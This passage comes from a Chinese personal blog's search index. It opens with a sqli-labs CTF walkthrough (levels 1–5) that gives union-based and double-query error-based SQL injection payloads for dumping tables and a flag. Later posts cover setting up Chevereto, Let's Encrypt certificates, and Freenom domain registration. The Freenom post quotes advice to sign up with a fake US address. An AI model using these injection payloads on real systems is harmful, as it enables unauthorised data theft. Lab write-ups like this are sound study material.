src="https://s1.ax1x.com/2020/11/04/BgZbfs.png"></p><p>​    利用元数据库来爆表、爆数据</p><p>​    <code>?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p><p>​    之后大家可以自行发挥。</p><p>​    <code>flag</code>的话我做的题是在<code>ctftraining.flag</code>表中，答案在：<code>?id=&#39; union select 1,flag,3 from ctftraining.flag  --+</code></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>​    第二题看题目名称<code>intiger based</code>知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。</p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>​    看标题<code>Single quotes with twist</code>，是在前面题的基础上加上了括号包裹，所以语句就成了<code>where id = (&#39;id&#39;)</code>所以我们闭合的方式也要改变。附源码</p><p><img src="https://s1.ax1x.com/2020/11/04/BgnO1A.png"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>​    标题<code>Double Quotes</code>，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。</p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>​    标题<code>Double Injection-Single Quotes</code>，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个<code>You are in...........</code>，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。</p><p>​    双查询注入也是我第一次听，贴一个讲大致原理的帖子：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Leep0rt/article/details/78556440">点我</a>。</p><p>​    构造语句：</p><p><code>?id=&#39; union select 1,2,3 from (select 1,count(*),concat_ws(&#39;____________&#39;,floor(rand()*2),concat_ws(&#39;********&#39;,version(),database()))a from information_schema.tables group by a)b --+</code></p><p>​    讲一下<code>CONCAT_WS(separator,str1,str2,…)</code>函数的用法：把<code>str1</code>、<code>str2</code>连接起来，并使用<code>separator</code>做分隔符。</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chevereto-搭建一个自己的图床</title>
      <link href="2020/Chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/"/>
      <url>2020/Chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章<del>越写越多</del>用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到<del>限制</del>，正好发现了<code>Chevereto</code>这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。</p><h3 id="Chevereto-说明"><a href="#Chevereto-说明" class="headerlink" title="Chevereto 说明"></a>Chevereto 说明</h3><blockquote><p>Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。</p></blockquote><p><code>Chevereto</code>分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣</p><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>因为<code>Chevereto</code>所需要的环境为</p><ul><li><p>Apache/Nginx</p></li><li><p>PHP 5.5+</p></li><li><p>MySQL 5.0+</p></li></ul><p><del>我太懒了不想动</del>所以我选择使用宝塔面板为我们搭建web环境。</p><p>宝塔面板官网：<a target="_blank" rel="noopener" href="https://www.bt.cn/">https://www.bt.cn/</a></p><p>安装完成以后进入管理面板应该会直接提示你安装需要的环境</p><p>我的环境如下图</p><p><img src="https://s1.ax1x.com/2020/10/29/BJ9TVP.png" alt="BJ9TVP.png"></p><h3 id="总结安装步骤"><a href="#总结安装步骤" class="headerlink" title="总结安装步骤"></a>总结安装步骤</h3><ol><li>去github下载Chevereto的压缩包。</li><li>在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。</li><li>将Chevereto的压缩包上传到网站目录解压。</li><li>访问新建的网站就是Chevereto的管理面板，并进行初始配置。</li><li>无了。</li></ol><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><ul><li><p><a target="_blank" rel="noopener" href="https://github.com/Chevereto/Chevereto-Free/releases">github下载地址</a></p></li><li><p>创建网站目录和数据库用户</p></li></ul><p><img src="https://s1.ax1x.com/2020/10/29/BJ9H58.png" alt="BJ9H58.png"></p><p>因为我域名所以域名留空，提示默认使用<code>80</code>端口，访问地址就是服务器ip地址，剩下的自己随机发挥。</p><ul><li>创建完成后需要配置一下网站配置文件才可以访问到配置页面。</li></ul><p><img src="https://s1.ax1x.com/2020/10/29/BJ9Ibt.png" alt="BJ9Ibt.png"></p><p><img src="https://s1.ax1x.com/2020/10/29/BJ9qPS.png" alt="BJ9qPS.png"></p><p>在<code>server&#123;...&#125;</code>中添加</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?<span class="variable">$query_string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置完成以后应该会自动保存并重启<code>Nginx</code>。</p><ul><li>将在github上下载的<code>Chevereto</code>压缩包上传到刚刚创建的网站目录中（上图是<code>/www/wwwroot</code>）并解压。</li></ul><p>之后就可以直接访问<code>服务器ip:80</code>（80端口可以省略），然后一步一步的进行配置。</p><p><strong>可能会出现的错误</strong></p><blockquote><p><code>Chevereto can’t create the app/settings.php file. You must manually create this file</code></p></blockquote><p>解决方法：这个错误就是没有找到<code>setting.php</code>配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在<code>Chevereto</code>的网站目录下的<code>/app</code>目录下执行命令创建文件，并修改文件权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch settings.php</span><br><span class="line">chmod +x settings.php</span><br></pre></td></tr></table></figure><blockquote><p>我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。</p></blockquote><ul><li>访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。</li></ul><p><img src="https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg" alt="BJ97Uf.jpg"></p><p><img src="https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg" alt="BJ9O2Q.jpg"></p><p>完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。</p><h3 id="完工"><a href="#完工" class="headerlink" title="完工"></a>完工</h3><p>管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习</p><p>然后我的图床地址：<a target="_blank" rel="noopener" href="http://47.97.231.10/">http://47.97.231.10/</a> (已失效)    <del>🈚👇👻来丶se兔</del></p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 宝塔面板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Let&#39;s Encrypt 免费Https证书</title>
      <link href="2020/Let&#39;s%20Encrypt%20%E5%85%8D%E8%B4%B9Https%E8%AF%81%E4%B9%A6/"/>
      <url>2020/Let&#39;s%20Encrypt%20%E5%85%8D%E8%B4%B9Https%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>参考文章:<a target="_blank" rel="noopener" href="https://imququ.com/post/letsencrypt-certificate.html">Let’s Encrypt，免费好用的 HTTPS 证书</a></p><h3 id="先放官网"><a href="#先放官网" class="headerlink" title="先放官网"></a>先放官网</h3><p><a target="_blank" rel="noopener" href="https://letsencrypt.org/">Let’s Encrypt</a></p><blockquote><p><a target="_blank" rel="noopener" href="https://letsencrypt.org/">Let’s Encrypt</a> 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛</p></blockquote><hr><h4 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h4><ul><li><p>一个 HTTP 服务，以 Nginx 为例</p></li><li><p>python</p></li><li><p>两个目录:</p><blockquote><p>/site    网站目录</p><p>/site_site_cert    保存证书的目录</p></blockquote></li></ul><p><strong>证书的颁发有两种方式：</strong></p><h4 id="通过在线生成"><a href="#通过在线生成" class="headerlink" title="通过在线生成"></a>通过在线生成</h4><p>通过网址在线生成，需要验证文件</p><h4 id="通过程序生成"><a href="#通过程序生成" class="headerlink" title="通过程序生成"></a>通过程序生成</h4><p>通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。</p><p>我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。</p><hr><h3 id="开工"><a href="#开工" class="headerlink" title="开工"></a>开工</h3><h3 id="创建账号"><a href="#创建账号" class="headerlink" title="创建账号"></a>创建账号</h3><p>首先创建一个目录，我是在根目录下创建文件夹site_cert</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /site_cert</span><br></pre></td></tr></table></figure><p>这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let’s Encrypt识别你的身份</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa 4096 &gt; account.key</span><br></pre></td></tr></table></figure><h3 id="创建CSR文件"><a href="#创建CSR文件" class="headerlink" title="创建CSR文件"></a>创建CSR文件</h3><p>在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa 4096 &gt; domain.key</span><br></pre></td></tr></table></figure><p>我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧</p><blockquote><p>RSA 私钥：兼容性好</p><p>ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小</p></blockquote><p>两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 <code>www</code> 和不带 <code>www</code> 的两种情况都加进去，一张证书最多可以包含100个域名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -sha256 -key domain.key -subj &quot;/&quot; -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf &quot;[SAN]\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com&quot;)) &gt; domain.csr</span><br></pre></td></tr></table></figure><ul><li>其中DNS的<code>yoursite.com</code>和<code>www.yoursite.com</code>记得要换成自己的域名</li></ul><p>我在这里遇到了问题提示找不到<code>/etc/ssl/openssl.cnf</code>文件，在网上找的的<a target="_blank" rel="noopener" href="https://blog.csdn.net/hjxdreamer/article/details/103296944">解决办法</a>是</p><p>执行 :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl version -a</span><br></pre></td></tr></table></figure><p>会输出openssl的信息，其中<code>OPENSSLDIR</code>对应的路径就是<code>openssl.cnf</code>文件的地址，自行将上面的<code>cat /etc/ssl/openssl.cnf</code>,改为自己的路径运行。</p><h3 id="配置验证服务"><a href="#配置验证服务" class="headerlink" title="配置验证服务"></a>配置验证服务</h3><p>前面介绍过了Let’s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。</p><p>创建用于存放网站的目录site以及用于验证文件存放的子目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /site/.well-known/acme-challenge/</span><br></pre></td></tr></table></figure><p>然后再Nginx中配置:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">server_name</span> www.yoursite.com yoursite.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /.well-known/acme-challenge/ &#123;</span><br><span class="line">        <span class="attribute">alias</span> /home/xxx/www/challenges/;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> https://yoursite.com/<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>别忘了改<code>yoursite</code></li></ul><p>这个配置会优先查找<code>/site</code>目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。</p><h3 id="获取网站证书"><a href="#获取网站证书" class="headerlink" title="获取网站证书"></a>获取网站证书</h3><p>先下载<code>acme-tiny</code>脚本到之前的site_cert目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py</span><br></pre></td></tr></table></figure><p>指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &gt; ./signed.crt</span><br></pre></td></tr></table></figure><p>执行成功的话会在当前目录生成一个<code>signed.crt</code>文件，这个文件就是申请好的证书文件。</p><p>我在这里出现了错误提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: Wrote file to &#x2F;site&#x2F;.well-known&#x2F;acme-challenge&#x2F;blablabla, but couldn&#39;t download http:&#x2F;&#x2F;www.yoursite.com&#x2F;.well-known&#x2F;acme-challenge&#x2F;blablabla</span><br></pre></td></tr></table></figure><p>大概的意思就是，在网站目录里写入了一个验证文件，但是Let’s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：</p><blockquote><p><a target="_blank" rel="noopener" href="https://dns.he.net/">Hurricane Electric Free DNS</a></p><p><a target="_blank" rel="noopener" href="https://www.zoneedit.com/">ZoneEdit</a></p><p><a target="_blank" rel="noopener" href="https://www.cloudflare.com/">CloudFlare</a></p></blockquote><p>这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。</p><p>网站证书到手以后，还要下载 Let’s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat signed.crt intermediate.pem &gt; chained.pem</span><br></pre></td></tr></table></figure><p><strong>最终</strong>，在Nginx中添加证书配置，并reload，我的部分配置如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">   <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">   <span class="attribute">ssl_certificate</span>       /site_cert/chained.pem;</span><br><span class="line">   <span class="attribute">ssl_certificate_key</span>   /site_cert/domain.key;</span><br><span class="line">   <span class="attribute">ssl_protocols</span>         TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">   <span class="attribute">ssl_ciphers</span>           HIGH:!aNULL:!MD5;</span><br><span class="line">   <span class="attribute">server_name</span>           braindance.tk;</span><br><span class="line">   <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">   <span class="attribute">root</span> </span><br><span class="line">        …………………………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="证书自动更新-计划任务"><a href="#证书自动更新-计划任务" class="headerlink" title="证书自动更新 计划任务"></a>证书自动更新 计划任务</h3><p>​    至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。</p><p>用 <code>vi</code> 在 <code>/site_cert</code> 文件夹 创建 计划任务脚本 <code>renew_cert.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /site_cert/renew_cert.sh</span><br></pre></td></tr></table></figure><p>通过<code>vi</code>输入以下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cd /fakesite_cert/</span><br><span class="line">python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &gt; ./signed.crt || exit</span><br><span class="line">wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem</span><br><span class="line">cat signed.crt intermediate.pem &gt; chained.pem</span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><p>更新的大致过程是，运行python脚本再次更新<code>signed.crt</code>申请证书文件，再进行证书合并写入<code>chained.pem</code>文件。</p><p>然后给这个文件赋予 可执行 属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /fakesite_cert/renew_cert.sh</span><br></pre></td></tr></table></figure><p>使用<code>crontab -e</code>指令打开定时任务配置文件，并加入以下内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 1 * * &#x2F;home&#x2F;xxx&#x2F;shell&#x2F;renew_cert.sh &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>对于上面指令的具体意思请自行搜索<code>crontab</code>命令</p><h3 id="完工"><a href="#完工" class="headerlink" title="完工"></a>完工</h3>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Https证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭窝过程(二)</title>
      <link href="2020/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B(%E4%BA%8C)/"/>
      <url>2020/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。</p><p>​    还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个<a target="_blank" rel="noopener" href="https://github.com/ShadowsocksR-Live/shadowsocksr-native">项目</a>，使用的技术大概就是反向代理+Https的协议，这里就不细讲了<del>主要是害怕</del>，可以自己到项目去看看。</p><p>​    在这里还学会了搞<a target="_blank" rel="noopener" href="https://letsencrypt.org/">Let’s Encrypt</a>的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。</p>]]></content>
      
      
      <categories>
          
          <category> 流水账 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Freenom域名注册解析到服务器</title>
      <link href="2020/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2020/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-官网"><a href="#1-官网" class="headerlink" title="1.官网"></a><strong>1.官网</strong></h3><p><a target="_blank" rel="noopener" href="https://www.freenom.com/zh/index.html?lang=zh">Freenom - 人人都熟悉的名字</a></p><p>官网右上角可以切换中文，简直了。</p><p>然后觉得我讲的有点啰嗦的还可以看油管上的<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=IAZDrtmQeh0">freenom教学视频</a></p><p><img src="https://s1.ax1x.com/2020/10/29/BJ9Xvj.png" alt="BJ9Xvj.png"></p><h3 id="2-搜索想要的域名"><a href="#2-搜索想要的域名" class="headerlink" title="2.搜索想要的域名"></a><strong>2.搜索想要的域名</strong></h3><p><img src="https://s1.ax1x.com/2020/10/29/BJCFGF.png" alt="BJCFGF.png"></p><p>​    搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。</p><p>​    我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是<a target="_blank" rel="noopener" href="https://dns.he.net/">Hurricane Electric Hosted <em>DNS</em></a>，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑</p><p><img src="https://s1.ax1x.com/2020/10/29/BJ9xrn.png" alt="BJ9xrn.png">接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。</p><p><img src="https://s1.ax1x.com/2020/10/29/BJ9vKs.png" alt="BJ9vKs.png">点击continue按钮会提示注册，这里又有坑。</p><blockquote><p>由于蝗虫一般涌入试图薅羊毛的中国人让 <code>freenom</code> 极度不爽, <code>freenom</code> 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 <a target="_blank" rel="noopener" href="https://www.fakenamegenerator.com/">fakenamegenerator.com</a> 胡诌个美国住址, 就可以随意注册免费域名了. </p></blockquote><h3 id="3-域名解析"><a href="#3-域名解析" class="headerlink" title="3.域名解析"></a><strong>3.域名解析</strong></h3><p>​    完成以后点击Services–&gt;My Domains进入域名管理页面。</p><p><img src="https://s1.ax1x.com/2020/10/29/BJCk24.png" alt="BJCk24.png"></p><p>点击域名后面的Manage Domain进入域名解析</p><p><img src="https://raw.githubusercontent.com/guobang-yoo/PicBed/master/20201029160037.png"></p><p><img src="https://s1.ax1x.com/2020/10/29/BJCpV0.png" alt="BJCpV0.png"></p><p>​    Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。</p><p><img src="https://s1.ax1x.com/2020/10/29/BJC9aV.png" alt="BJC9aV.png"></p><p>之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：</p><p><img src="https://s1.ax1x.com/2020/10/29/BJCiPU.png" alt="BJCiPU.png"></p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>造窝过程(一)</title>
      <link href="2020/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-(%E4%B8%80)/"/>
      <url>2020/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li>备案劝退</li></ul><p>很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息&gt;&gt;&gt;阿里云审核通过&gt;&gt;&gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？<img src="https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg" alt="BJ9L8g.jpg">看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。</p><ul><li>选择服务器</li></ul><p>听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：<a target="_blank" rel="noopener" href="https://www.vultr.com/">vultr</a>、<a target="_blank" rel="noopener" href="https://bwh88.net/">搬瓦工</a>、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的<a target="_blank" rel="noopener" href="https://www.pacificrack.com/">pacificrack</a>,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！</p><ul><li>域名注册</li></ul><p>服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商<a href="www.freenom.com">freenom</a>，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。</p><p>到这服务器和域名都搞定了。</p>]]></content>
      
      
      <categories>
          
          <category> 流水账 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一篇文章</title>
      <link href="2020/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>2020/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>第一篇文章的内容</strong></p><p>刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。</p>]]></content>
      
      
      <categories>
          
          <category> 流水账 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
